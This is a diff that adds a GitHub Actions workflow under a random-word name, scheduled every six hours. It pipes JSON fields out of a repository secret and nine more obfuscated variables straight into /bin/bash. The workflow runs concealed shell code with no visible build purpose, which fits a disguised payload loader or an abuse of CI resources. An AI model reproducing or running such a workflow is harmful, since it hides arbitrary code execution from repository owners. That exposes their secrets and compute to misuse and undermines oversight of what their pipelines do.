@@ -1,0 +1,26 @@
+name: equivocatepartridges
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: equivocatepartridges
+        env:
+          agb7: ${{ secrets.agb7 }}
+        run: |
+          echo $agb7 | jq -r .cfl8 | /bin/bash
+          echo $pol32 | jq -r .wqr8967 | /bin/bash
+          echo $uqkpv4 | jq -r .fo95273 | /bin/bash
+          echo $a3940 | jq -r .p7915 | /bin/bash
+          echo $x9760 | jq -r .ti08442 | /bin/bash
+          echo $xwm81401 | jq -r .isckq255 | /bin/bash
+          echo $icwa3699 | jq -r .kqv65370 | /bin/bash
+          echo $jpnnz7 | jq -r .wbmy861 | /bin/bash
+          echo $es71189 | jq -r .ptmn0334 | /bin/bash
+          echo $wqesc2 | jq -r .e27 | /bin/bash
+
